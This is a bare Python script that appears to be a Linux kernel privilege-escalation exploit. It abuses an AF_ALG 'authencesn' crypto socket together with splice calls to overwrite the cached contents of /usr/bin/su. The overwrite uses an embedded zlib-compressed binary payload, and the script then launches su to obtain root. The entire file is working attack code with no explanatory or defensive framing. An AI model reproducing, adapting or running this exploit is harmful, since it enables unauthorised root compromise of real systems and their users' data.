#!/usr/bin/env python3
import os
import zlib
import socket

def hex_to_bytes(hex_str):
    return bytes.fromhex(hex_str)

def inject_chunk(file_fd, offset, chunk):
    alg_sock = socket.socket(38, 5, 0)
    alg_sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    
    SOL_ALG = 279
    
    alg_sock.setsockopt(SOL_ALG, 1, hex_to_bytes('0800010000000010' + '0' * 64))
    alg_sock.setsockopt(SOL_ALG, 5, None, 4)
    
    conn, _ = alg_sock.accept()
    
    chunk_size = offset + 4
    null_byte = hex_to_bytes('00')
    
    conn.sendmsg(
        [b"A" * 4 + chunk],
        [
            (SOL_ALG, 3, null_byte * 4),
            (SOL_ALG, 2, b'\x10' + null_byte * 19),
            (SOL_ALG, 4, b'\x08' + null_byte * 3),
        ],
        32768
    )
    
    read_pipe, write_pipe = os.pipe()
    
    os.splice(file_fd, write_pipe, chunk_size, offset_src=0)
    os.splice(read_pipe, conn.fileno(), chunk_size)
    
    try:
        conn.recv(8 + offset)
    except Exception:
        pass

su_fd = os.open("/usr/bin/su", 0)

hex_payload = "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
payload = zlib.decompress(hex_to_bytes(hex_payload))

offset = 0
while offset < len(payload):
    chunk = payload[offset : offset+4]
    inject_chunk(su_fd, offset, chunk)
    offset += 4

os.system("su")
